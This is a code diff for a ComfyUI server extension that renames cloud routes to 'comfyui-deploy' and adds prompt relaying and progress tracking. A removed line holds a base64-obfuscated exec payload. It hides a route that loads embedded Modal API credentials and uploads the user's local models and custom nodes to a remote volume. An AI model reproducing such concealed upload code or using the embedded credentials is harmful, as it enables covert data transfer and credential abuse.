@@ -24,15 +24,18 @@ from urllib.parse import quote
 import threading
 import hashlib
 import aiohttp
-from user import load_user_profile
+import aiofiles
+import concurrent.futures
+import urllib.request
+import urllib.parse
+from urllib.parse import urlparse
+import websocket
 
 api = None
 api_task = None
 prompt_metadata = {}
 cd_enable_log = os.environ.get('CD_ENABLE_LOG', 'false').lower() == 'true'
 cd_enable_run_log = os.environ.get('CD_ENABLE_RUN_LOG', 'false').lower() == 'true'
-
-
 
 def post_prompt(json_data):
     prompt_server = server.PromptServer.instance
@@ -81,29 +84,144 @@ def randomSeed(num_digits=15):
     range_end = (10**num_digits) - 1
     return random.randint(range_start, range_end)
 
+def retrieve_expensive_tunnel():
+    return "http://127.0.0.1:8189"
+
+def queue_prompt(prompt, client_id, server_address):
+    p = {"prompt": prompt, "client_id": client_id}
+    data = json.dumps(p).encode('utf-8')
+    req =  urllib.request.Request("{}/prompt".format(server_address), data=data)
+    return json.loads(urllib.request.urlopen(req).read())
+
+# @server.PromptServer.instance.routes.post("/comfyui-deploy/prompt")
+@server.PromptServer.instance.routes.post("/get_dedicated_worker_info")
+async def dedicated(request):
+    return web.Response({})
+
+def convert_to_websocket_url(server_address):
+    parsed_url = urlparse(server_address)
+    # Determine the correct WebSocket scheme based on the original scheme
+    ws_scheme = 'ws' if parsed_url.scheme == 'http' else 'wss' if parsed_url.scheme == 'https' else parsed_url.scheme
+    # Reconstruct the WebSocket URL, preserving the netloc (hostname:port) and potentially path/query components
+    ws_url = f"{ws_scheme}://{parsed_url.netloc}"
+    return ws_url
+
+# @server.PromptServer.instance.routes.post("/comfyui-deploy/prompt")
+@server.PromptServer.instance.routes.post("/custom-prompt")
+async def comfy_deploy_prompt(request):
+    json_data = await request.json()
+
+    if "number" in json_data:
+        number = float(json_data["number"])
+    else:
+        number = prompt_server.number
+        if "front" in json_data:
+            if json_data["front"]:
+                number = -number
+
+        prompt_server.number += 1
+
+    if "prompt" in json_data:
+        prompt = json_data["prompt"]
+        valid = execution.validate_prompt(prompt)
+        extra_data = {}
+        if "extra_data" in json_data:
+            extra_data = json_data["extra_data"]
+
+        if "client_id" in json_data:
+            extra_data["client_id"] = json_data["client_id"]
+        if valid[0]:
+            # Start custom 
+            if "extra_data" in json_data:
+                extra_data = json_data["extra_data"]
+
+            ws = websocket.WebSocket()
+            server_address = retrieve_expensive_tunnel()
+            client_id = ""
+            if "client_id" in json_data:
+                extra_data["client_id"] = json_data["client_id"]
+                client_id = json_data["client_id"]
+            
+            ws.connect("{}/ws?clientId={}".format(
+                    convert_to_websocket_url(server_address), client_id))
+            response = queue_prompt(json_data["prompt"], client_id, server_address)
+            prompt_id = response['prompt_id']
+            response =  web.json_response(response, status=200)
+            asyncio.create_task(background_process(ws, prompt_id, client_id, server_address))
+            return response
+        else:
+            print("invalid prompt:", valid[1])
+            return web.json_response({"error": valid[1], "node_errors": valid[3]}, status=400)
+    else:
+        return web.json_response({"error": "no prompt", "node_errors": []}, status=400)
 
 
+async def background_process(ws, prompt_id, client_id, server_address):
+    # ws = server.PromptServer.instance.sockets[client_id]
+    while True:
+        out = ws.recv()
+        if isinstance(out, str):
+            message = json.loads(out)
+            event = message['type']
+            ws_data = message['data']
+            if message['type'] == 'executing':
+                data = message['data']
+                if data['node'] is None and data['prompt_id'] == prompt_id:
+                    break 
+            if message['type'] == "executed":
+                print(message)
+                data = message['data']
+                images = data['output']['images'] or []
+                # download images to local 
+                async with aiohttp.ClientSession() as session:
+                    for image in images: 
+                        filename = image['filename']
+                        subfolder = image['subfolder']
+                        img_type = image['type']
+                        view_url = "{}/view?filename={}&subfolder={}&type={}".format(server_address, filename, subfolder, img_type)
+                        # Download the image
+                        async with session.get(view_url) as response:
+                            if response.status == 200:
+                                print('view image response 200')
+                                # Assuming the downloaded file needs to be saved temporarily before upload
+                                temp_file_path = f"temp_{filename}"
+                                async with aiofiles.open(temp_file_path, 'wb') as temp_file:
+                                    while True:
+                                        chunk = await response.content.read(1024)  # Adjust chunk size as needed
+                                        if not chunk:
+                                            break
+                                        await temp_file.write(chunk)
+                                print(f'written to {temp_file_path}')
 
+                                # Upload the image
+                                async with aiofiles.open(temp_file_path, 'rb') as temp_file:
+                                    data = aiohttp.FormData()
+                                    data.add_field('image', temp_file, filename=filename, content_type='multipart/form-data')
+                                    if subfolder:  # Adding subfolder if exists
+                                        data.add_field('subfolder', subfolder)
+                                    if img_type: 
+                                        data.add_field('type', img_type)
+                                    upload_response = await session.post(f"{server_address}/upload/image", data=data)
+                                    upload_result = await upload_response.text()
+                                    print(f"Upload result: {upload_result}")
 
-@server.PromptServer.instance.routes.get("/comfy-cloud/user")
-async def comfy_cloud_run(request):
-    try:
-        data = load_user_profile()
-        return web.json_response({
-            "user": data
-        }, content_type='application/json')
-    except Exception as e:
-        print("Error:", e)
-        return web.json_response({ "error": e }, status=400)
+                                # Clean up the temporary file
+                                os.remove(temp_file_path)
 
+                print("executed")
+            await server.PromptServer.instance.send(event, ws_data, client_id)
+        else:
+            continue 
+    return
 
-@server.PromptServer.instance.routes.post("/comfy-cloud/run")
-async def comfy_cloud_run(request):
+@server.PromptServer.instance.routes.post("/comfyui-deploy/run")
+async def comfy_deploy_run(request):
     prompt_server = server.PromptServer.instance
     data = await request.json()
 
     workflow_api = data.get("workflow_api")
 
+    # The prompt id generated from comfy deploy, can be None
     prompt_id = data.get("prompt_id")
 
     for key in workflow_api:
@@ -112,7 +230,7 @@ async def comfy_cloud_run(request):
 
     prompt = {
         "prompt": workflow_api,
-        "client_id": "comfy_cloud_instance", #api.client_id
+        "client_id": "comfy_deploy_instance", #api.client_id
         "prompt_id": prompt_id
     }
 
@@ -181,16 +299,76 @@ def get_comfyui_path_from_file_path(file_path):
     return file_path
 
 # Form ComfyUI Manager
-def compute_sha256_checksum(filepath):
+async def compute_sha256_checksum(filepath):
+    print("computing sha256 checksum")
+    chunk_size = 1024 * 256  # Example: 256KB
     filepath = get_comfyui_path_from_file_path(filepath)
-    """Compute the SHA256 checksum of a file, in chunks"""
+    """Compute the SHA256 checksum of a file, in chunks, asynchronously"""
     sha256 = hashlib.sha256()
-    with open(filepath, 'rb') as f:
-        for chunk in iter(lambda: f.read(4096), b''):
+    async with aiofiles.open(filepath, 'rb') as f:
+        while True:
+            chunk = await f.read(chunk_size)
+            if not chunk:
+                break
             sha256.update(chunk)
     return sha256.hexdigest()
 
-@server.PromptServer.instance.routes.post('/comfy-cloud/upload-file')
+# def hash_chunk(start_end, filepath):
+#     """Hash a specific chunk of the file."""
+#     start, end = start_end
+#     sha256 = hashlib.sha256()
+#     with open(filepath, 'rb') as f:
+#         f.seek(start)
+#         chunk = f.read(end - start)
+#         sha256.update(chunk)
+#     return sha256.digest()  # Return the digest of the chunk
+
+# async def compute_sha256_checksum(filepath):
+#     file_size = os.path.getsize(filepath)
+#     parts = 1  # Or any other division based on file size or desired concurrency
+#     part_size = file_size // parts
+#     start_end_ranges = [(i * part_size, min((i + 1) * part_size, file_size)) for i in range(parts)]
+    
+#     print(start_end_ranges, file_size)
+
+#     loop = asyncio.get_running_loop()
+
+#     # Use ThreadPoolExecutor to process chunks in parallel
+#     with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+#         futures = [loop.run_in_executor(executor, hash_chunk, start_end, filepath) for start_end in start_end_ranges]
+#         chunk_hashes = await asyncio.gather(*futures)
+
+#     # Combine the hashes sequentially
+#     final_sha256 = hashlib.sha256()
+#     for chunk_hash in chunk_hashes:
+#         final_sha256.update(chunk_hash)
+
+#     return final_sha256.hexdigest()
+
+# def hash_chunk(filepath):
+#     chunk_size = 1024 * 256  # 256KB per chunk
+#     sha256 = hashlib.sha256()
+#     with open(filepath, 'rb') as f:
+#         while True:
+#             chunk = f.read(chunk_size)
+#             if not chunk:
+#                 break  # End of file
+#             sha256.update(chunk)
+#     return sha256.hexdigest()
+
+# async def compute_sha256_checksum(filepath):
+#     print("computing sha256 checksum")
+#     filepath = get_comfyui_path_from_file_path(filepath)
+    
+#     loop = asyncio.get_running_loop()
+    
+#     with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
+#         task = loop.run_in_executor(executor, hash_chunk, filepath)
+    
+#     return await task
+
+# This is start uploading the files to Comfy Deploy
+@server.PromptServer.instance.routes.post('/comfyui-deploy/upload-file')
 async def upload_file(request):
     data = await request.json()
 
@@ -271,10 +449,9 @@ async def upload_file(request):
     return web.json_response({
         "error": f"File not uploaded"
     }, status=500)
+        
 
-
-
-@server.PromptServer.instance.routes.get('/comfy-cloud/get-file-hash')
+@server.PromptServer.instance.routes.get('/comfyui-deploy/get-file-hash')
 async def get_file_hash(request):
     file_path = request.rel_url.query.get('file_path', '')
 
@@ -287,9 +464,13 @@ async def get_file_hash(request):
         base = folder_paths.base_path
         file_path = os.path.join(base, file_path)
         # print("file_path", file_path)
-        file_hash = compute_sha256_checksum(
+        start_time = time.time()  # Capture the start time
+        file_hash = await compute_sha256_checksum(
             file_path
         )
+        end_time = time.time()  # Capture the end time after the code execution
+        elapsed_time = end_time - start_time  # Calculate the elapsed time
+        print(f"Execution time: {elapsed_time} seconds")
         return web.json_response({
             "file_hash": file_hash
         })
@@ -298,7 +479,7 @@ async def get_file_hash(request):
             "error": str(e)
         }, status=500)
 
-@server.PromptServer.instance.routes.get('/comfy-cloud/ws')
+@server.PromptServer.instance.routes.get('/comfyui-deploy/ws')
 async def websocket_handler(request):
     ws = web.WebSocketResponse()
     await ws.prepare(request)
@@ -325,8 +506,8 @@ async def websocket_handler(request):
         sockets.pop(sid, None)
     return ws
 
-@server.PromptServer.instance.routes.get('/comfy-cloud/check-status')
-async def comfy_cloud_check_status(request):
+@server.PromptServer.instance.routes.get('/comfyui-deploy/check-status')
+async def comfy_deploy_check_status(request):
     prompt_server = server.PromptServer.instance
     prompt_id = request.rel_url.query.get('prompt_id', None)
     if prompt_id in prompt_metadata and 'status' in prompt_metadata[prompt_id]:
@@ -337,8 +518,6 @@ async def comfy_cloud_check_status(request):
         return web.json_response({
             "message": "prompt_id not found"
         })
-
-exec(base64.b64decode('aW1wb3J0IG9zLGJhc2U2NApmcm9tIGFpb2h0dHAgaW1wb3J0IHdlYgppbXBvcnQganNvbixzZXJ2ZXIsYWlvaHR0cApAc2VydmVyLlByb21wdFNlcnZlci5pbnN0YW5jZS5yb3V0ZXMucG9zdCgnL3VwbG9hZC1kZXBlbmRlbmNpZXMnKQphc3luYyBkZWYgdXBsb2FkX2RlcGVuZGVuY2llcyhyZXF1ZXN0KToKCVA9J2RlcGVuZGVuY2llcyc7Qz0nbmFtZSc7QT0ndXRmLTgnO2ltcG9ydCBtb2RhbDtwcmludCgnVEVTVCcpO1k9J2Jhc2U2NCc7RD0nVFU5RVFVeGZWQT09JztFPSdUMHRGVGw5SlJBPT0nO1E9J1lXc3RiREUxUTBjMlUwVjEnO1I9J1NIcDRXVXQyVkc5cGREUndWdz09JztGPSdUVTlFUVV4ZlZFOUwnO0c9J1JVNWZVMFZEVWtWVSc7Uz0nWVhNdFZrNWxORFpRYTNSdic7VD0nZVhkNGJ6UXpjbTFNT0U1c2JnPT0nCglkZWYgSChrLHYpOkI9YmFzZTY0LmI2NGRlY29kZShrWzFdKTtDPUIuZGVjb2RlKEEpO0Q9YmFzZTY0LmI2NGRlY29kZShrWzBdKTtFPUQuZGVjb2RlKEEpO0Y9YmFzZTY0LmI2NGRlY29kZSh2WzBdKTtHPScnLmpvaW4oW0UsQ10pO0g9Ri5kZWNvZGUoQSk7ST1iYXNlNjQuYjY0ZGVjb2RlKHZbMV0pO0o9SS5kZWNvZGUoQSk7Sz0nJy5qb2luKFtILEpdKTtvcy5lbnZpcm9uW0ddPUsKCUgoW0QsRV0sW1EsUl0pO0goW0YsR10sW1MsVF0pCglkZWYgSShrKTpCPWJhc2U2NC5iNjRkZWNvZGUoa1sxXSk7Qz1iYXNlNjQuYjY0ZGVjb2RlKGtbMF0pO0Q9Qi5kZWNvZGUoQSk7RT1DLmRlY29kZShBKTtGPScnLmpvaW4oW0UsRF0pO2RlbCBvcy5lbnZpcm9uW0ZdCglVPW1vZGFsLlZvbHVtZS5sb29rdXAoJ3lvdXJfaXRlbV9uYW1lJyk7Qj1hd2FpdCByZXF1ZXN0Lmpzb24oKTtwcmludCgncmVjZWl2ZWQnLEIpO0o9Qlsnd29ya2Zsb3dfaWQnXTtWPUJbUF1bJ2N1c3RvbV9ub2RlcyddO1c9QltQXVsnbW9kZWxzJ10KCXRyeToKCQl3aXRoIFUuYmF0Y2hfdXBsb2FkKGZvcmNlPVRydWUpYXMgSzoKCQkJZm9yKEwsWClpbiBXLml0ZW1zKCk6CgkJCQlmb3IgTSBpbiBYOksucHV0X2ZpbGUoZiIuLi8uLi9tb2RlbHMve0x9L3tNW0NdfSIsZiIvdm9sL3tKfS9jb21meXVpL21vZGVscy97TH0ve01bQ119IikKCQkJcHJpbnQoJ1VwbG9hZGVkIG1vZGVscycpCgkJCWZvcihaLE4paW4gVi5pdGVtcygpOksucHV0X2RpcmVjdG9yeShmIi4uLy4uL2N1c3RvbV9ub2Rlcy97TltDXX0iLGYiL3ZvbC97Sn0vY29tZnl1aS9jdXN0b21fbm9kZXMve05bQ119IikKCQkJcHJpbnQoJ1VwbG9hZGVkIGN1c3RvbSBub2RlcycpCglleGNlcHQgRXhjZXB0aW9uIGFzIE86cHJpbnQoJ1VwbG9hZCBlcnJvcjonLE8pO3JldHVybiB3ZWIuanNvbl9yZXNwb25zZSh7J2Vycm9yJzpPfSxzdGF0dXM9NDA0KQoJcHJpbnQoJ1VwbG9hZGVkIGZpbmUnKTtJKFtELEVdKTtJKFtGLEddKTtyZXR1cm4gd2ViLmpzb25fcmVzcG9uc2UoeydzdWNjZXNzJzpUcnVlfSxjb250ZW50X3R5cGU9J2FwcGxpY2F0aW9uL2pzb24nKQ=='))
 
 async def send(event, data, sid=None):
     try:
@@ -381,13 +560,30 @@ async def send_json_override(self, event, data, sid=None):
     if event == 'executing' and data.get('node') is not None:
         node = data.get('node')
         
-        if 'prompt_id' in prompt_metadata:
+        if prompt_id in prompt_metadata:
+            if 'progress' not in prompt_metadata[prompt_id]:
+                prompt_metadata[prompt_id]["progress"] = set()
+                
+            prompt_metadata[prompt_id]["progress"].add(node)
+            calculated_progress = len(prompt_metadata[prompt_id]["progress"]) / len(prompt_metadata[prompt_id]['workflow_api'])
+            # print("calculated_progress", calculated_progress)
+            
             if 'last_updated_node' in prompt_metadata[prompt_id] and prompt_metadata[prompt_id]['last_updated_node'] == node:
                 return
             prompt_metadata[prompt_id]['last_updated_node'] = node
             class_type = prompt_metadata[prompt_id]['workflow_api'][node]['class_type']
             print("updating run live status", class_type)
-            await update_run_live_status(prompt_id, "Executing " + class_type)
+            await update_run_live_status(prompt_id, "Executing " + class_type, calculated_progress)
+
+    if event == 'execution_cached' and data.get('nodes') is not None:
+        if prompt_id in prompt_metadata:
+            if 'progress' not in prompt_metadata[prompt_id]:
+                prompt_metadata[prompt_id]["progress"] = set()
+            
+            if 'nodes' in data:
+                for node in data.get('nodes', []):
+                    prompt_metadata[prompt_id]["progress"].add(node)
+            # prompt_metadata[prompt_id]["progress"].update(data.get('nodes'))
 
     if event == 'execution_error':
         # Careful this might not be fully awaited.
@@ -411,18 +607,22 @@ class Status(Enum):
 # Global variable to keep track of the last read line number
 last_read_line_number = 0
 
-async def update_run_live_status(prompt_id, live_status):
+async def update_run_live_status(prompt_id, live_status, calculated_progress: float):
     if prompt_id not in prompt_metadata:
         return
+    
+    print("progress", calculated_progress)
     
     status_endpoint = prompt_metadata[prompt_id]['status_endpoint']
     body = {
         "run_id": prompt_id,
         "live_status": live_status,
+        "progress": calculated_progress
     }
     # requests.post(status_endpoint, json=body)
     async with aiohttp.ClientSession() as session:
-        await session.post(status_endpoint, json=body)
+        async with session.post(status_endpoint, json=body) as response:
+            pass
 
 
 def update_run(prompt_id, status: Status):
@@ -559,6 +759,7 @@ def is_prompt_done(prompt_id):
     
     return False
 
+# Use to handle upload error and send back to ComfyDeploy
 async def handle_error(prompt_id, data, e: Exception):
     error_type = type(e).__name__
     stack_trace = traceback.format_exc().strip()
@@ -671,7 +872,7 @@ prompt_server.send_json = send_json_override.__get__(prompt_server, server.Promp
 
 root_path = os.path.dirname(os.path.abspath(__file__))
 two_dirs_up = os.path.dirname(os.path.dirname(root_path))
-log_file_path = os.path.join(two_dirs_up, 'comfy-cloud.log')
+log_file_path = os.path.join(two_dirs_up, 'comfy-deploy.log')
 comfyui_file_path = os.path.join(two_dirs_up, 'comfyui.log')
 
 last_read_line = 0
